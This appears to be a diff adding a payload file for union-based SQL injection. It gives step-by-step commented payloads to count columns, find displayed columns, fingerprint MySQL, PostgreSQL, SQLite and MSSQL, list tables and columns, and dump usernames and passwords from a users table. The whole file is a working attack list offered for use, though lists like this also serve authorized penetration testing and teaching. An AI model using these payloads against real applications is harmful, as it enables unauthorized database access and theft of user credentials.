@@ -1,0 +1,70 @@
+# ============================================================
+# SQL Injection Payloads - Union-Based Extraction
+# ============================================================
+# Target: Queries that return visible output, e.g.:
+#   SELECT name, price FROM products WHERE category='INPUT'
+#
+# Step 1: Determine the number of columns with ORDER BY
+# Step 2: Find which columns are displayed
+# Step 3: Extract data via UNION SELECT
+# ============================================================
+
+# --- Step 1: Column count enumeration ---
+# Increment until you get an error to find the column count
+' ORDER BY 1 --
+' ORDER BY 2 --
+' ORDER BY 3 --
+' ORDER BY 4 --
+' ORDER BY 5 --
+' ORDER BY 10 --
+' ORDER BY 20 --
+
+# --- Step 2: Identify displayed columns ---
+# Replace N with the column count found in step 1
+# Look for which positions show in the page output
+' UNION SELECT NULL --
+' UNION SELECT NULL,NULL --
+' UNION SELECT NULL,NULL,NULL --
+' UNION SELECT NULL,NULL,NULL,NULL --
+' UNION SELECT 'a',NULL,NULL --
+' UNION SELECT NULL,'a',NULL --
+' UNION SELECT NULL,NULL,'a' --
+
+# --- Step 3: Database fingerprinting ---
+# MySQL
+' UNION SELECT @@version,NULL,NULL --
+' UNION SELECT version(),NULL,NULL --
+# PostgreSQL
+' UNION SELECT version(),NULL,NULL --
+# SQLite
+' UNION SELECT sqlite_version(),NULL,NULL --
+# MSSQL
+' UNION SELECT @@version,NULL,NULL --
+
+# --- Step 3: Extract table names ---
+# MySQL / MariaDB
+' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database() --
+# PostgreSQL
+' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='public' --
+# SQLite
+' UNION SELECT name,NULL,NULL FROM sqlite_master WHERE type='table' --
+# MSSQL
+' UNION SELECT name,NULL,NULL FROM sysobjects WHERE xtype='U' --
+
+# --- Step 3: Extract column names ---
+# MySQL / MariaDB
+' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users' --
+# PostgreSQL
+' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users' --
+# SQLite
+' UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE name='users' --
+
+# --- Step 3: Extract data ---
+' UNION SELECT username,password,NULL FROM users --
+' UNION SELECT username||':'||password,NULL,NULL FROM users --
+' UNION SELECT GROUP_CONCAT(username,0x3a,password),NULL,NULL FROM users --
+
+# --- Handling string type mismatches ---
+' UNION SELECT NULL,NULL,NULL WHERE 1=2 --
+' UNION SELECT 1,'a',NULL --
+' UNION SELECT 1,2,3 --
